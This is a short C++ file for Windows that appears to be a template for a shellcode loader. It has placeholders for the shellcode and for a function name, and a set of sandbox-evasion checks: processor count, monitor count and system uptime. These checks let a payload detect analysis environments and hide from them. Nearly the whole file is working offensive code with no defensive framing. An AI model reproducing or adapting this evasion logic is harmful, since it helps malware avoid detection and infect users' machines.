#include <Windows.h>

//####SHELLCODE####

#define MIN_UPTIME_MINUTES 10

bool isLowCPU() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors < 2;
}

bool CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData) {
    int *Count = (int*)dwData;
    (*Count)++;
    return true;
}

int MonitorCount() {
    int Count = 0;
    if (EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)MonitorEnumProc, (LPARAM)&Count))
        return Count;
    return -1; // signals an error
}

bool isLowMonitor() {
    return MonitorCount() < 1;
}

bool checkUptime(DWORD minMinutes) {
    ULONGLONG uptime_minutes = GetTickCount64() / (minMinutes * 1000);
    return uptime_minutes < MIN_UPTIME_MINUTES;
}

bool ####FUNCTION####() {
    return (isLowCPU() || isLowMonitor() || checkUptime(60));
}